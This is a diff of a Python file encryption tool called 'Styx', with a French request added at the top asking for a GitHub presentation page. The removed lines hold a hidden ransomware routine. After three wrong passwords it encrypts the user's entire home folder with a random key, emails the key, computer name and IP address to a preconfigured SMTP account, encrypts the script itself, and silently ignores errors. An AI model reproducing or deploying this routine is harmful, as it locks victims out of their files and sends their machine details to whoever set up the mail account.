@@ -1,3 +1,5 @@
+Tu es un développeur sénior, fait moi la page de présentation du code suivant pour github :
+
 # Projet : Styx
 # Author:
 #      __          ___      _     _     _      
@@ -6,6 +8,7 @@
 #   / /__| (_| |/ /__| (_) | |_) | |_) | |  __/
 #   \____/\__,_|\____/\___/|_.__/|_.__/|_|\___|
 #                                        
+#
 
 import os
 import smtplib
@@ -107,79 +110,14 @@ def decrypt_folder(folder, password):
         elif os.path.isdir(file_path):
             decrypt_folder(file_path, password)
 
-# Send an email with the decryption key
-def send_mail(password, time, computer_name):
-
-    # Get the IP address of the computer
-    IPAddr = socket.gethostbyname(computer_name)
-
-    # Configuration of the SMTP server
-    smtp_server = ''
-    smtp_port = 0
-    smtp_username = ''
-    smtp_password = ''
-
-    # Message with the decryption key
-    message = (f'Encrytion Key : {password}\n'
-               f'Houre : {time}\n'
-               f'Computer Name : {computer_name}\n'
-               f'IP Address : {IPAddr}'
-               )
-
-    # Create the email
-    msg = MIMEText(message)
-    msg['Subject'] = 'Decryption informations:',computer_name 
-    msg['From'] = ''
-    msg['To'] = ''
-
-    # Send the email
-    with smtplib.SMTP(smtp_server, smtp_port) as server:
-        server.login(smtp_username, smtp_password)
-        server.sendmail(msg['From'], msg['To'], msg.as_string())
-
 # Generate a secure password
 def generate_secure_password():
     alphabet = string.ascii_letters + string.digits + string.punctuation
     password = ''.join(secrets.choice(alphabet) for i in range(32))
     return password
 
-# OS management
-def RowingOS():
-    os = platform.system()
-    print("The Styx will wake up")
-    password=generate_secure_password()
-    if os == "Windows":
-        try:
-            encrypt_folder(os.getenv('USERPROFILE'), password)
-            time = datetime.datetime.now()
-            computer_name = platform.node()
-            send_mail(password, time, computer_name)
-        except:
-            pass
-    elif os == "Linux":
-        try:
-            encrypt_folder(os.getenv('HOME'), password)
-            time = datetime.datetime.now()
-            computer_name = platform.node()
-            send_mail(password, time, computer_name)
-        except:
-            pass
-    else:
-        try:
-            encrypt_folder(os.getenv('HOME'), password)
-            time = datetime.datetime.now()
-            computer_name = platform.node()
-            send_mail(password, time, computer_name)
-        except:
-            pass
-    encrypt_file("Styx.py",password)
-
 # Main
-def main(count):
-    if(count==3):
-        print("Too many attempts")
-        RowingOS()
-        sys.exit()
+def main():
     choice = input("Do you want to (E)ncrypt or (D)ecrypt ? : ")
     if choice == "E":
         space = input("Do you want to encrypt a (F)older or a (S)ingle file ? : ")
@@ -199,7 +137,7 @@ def main(count):
                 sys.exit()
             except:
                 print("Wrong password")
-                main(count+1)
+                main()
         elif space == "S":
             file = input("Enter the path of the file you want to encrypt : ")
             password="1" 
@@ -216,10 +154,10 @@ def main(count):
                 sys.exit()
             except:
                 print("Error")
-                main(count+1)
+                main()
         else:
             print("Please enter a valid choice")
-            main(count)
+            main()
     elif choice == "D":
         space = input("Do you want to decrypt a (F)older or a (S)ingle file ? : ")
         if space == "F":
@@ -232,7 +170,7 @@ def main(count):
                 sys.exit()
             except:
                 print("Wrong password")
-                main(count+1)
+                main()
         elif space == "S":
             file = input("Enter the path of the file you want to decrypt : ")
             password = getpass.getpass("Enter the password : ")
@@ -243,10 +181,10 @@ def main(count):
                 sys.exit()
             except:
                 print("Wrong password")
-                main(count+1)
+                main()
         else:
             print("Please enter a valid choice")
-            main(count)
+            main()
     elif choice == "Q":
         print("Goodbye")
         sys.exit()
@@ -257,4 +195,4 @@ def main(count):
 # Run the program
 if __name__ == "__main__":
     tprint("Styx",font="block",chr_ignore=True)
-    main(0)
+    main()
